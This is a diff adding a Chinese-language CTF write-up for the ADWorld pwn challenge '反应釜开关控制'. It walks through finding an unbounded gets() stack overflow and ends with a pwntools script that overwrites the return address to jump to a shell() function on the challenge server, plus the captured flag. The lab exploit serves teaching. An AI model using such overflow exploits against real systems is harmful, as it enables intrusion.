@@ -840,6 +840,41 @@ io.interactive()
 
 ------
 
+### [反应釜开关控制](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4912)
+
+先`file ./pwn4912`查看文件类型再`checksec --file=./pwn4912`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4912/1.png)
+
+用`IDA Pro 64bit`打开附件`pwn4912`，按`F5`反汇编源码并查看主函数。注意到`char`型数组变量`v5`的可用栈大小为`0x200`，但是`get()`函数读取输入到`v5`时并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4912/2.png)
+
+双击`v5`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x200`个字节占满`v5`变量，然后再加上`r`的`8`个字节。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4912/3.png)
+
+在`Functions window`中可以看到有一个名为`shell()`的函数，其返回值直接是系统调用`system("/bin/sh")`。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4912/4.png)
+
+编写`Python`代码即可得到`cyberpeace{987dd90c37712192c8f03a9f47c6e879}`。
+
+```python
+from pwn import *
+
+io = remote('111.200.241.244', 51772)
+e = ELF('./pwn4912')
+shell_address = e.symbols['shell']
+payload = b'a'*0x200 + b'fuckpwn!' + p64(shell_address)
+io.sendlineafter(b'>', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4912/5.png)
+
+------
+
 
 
 ## CTFShow
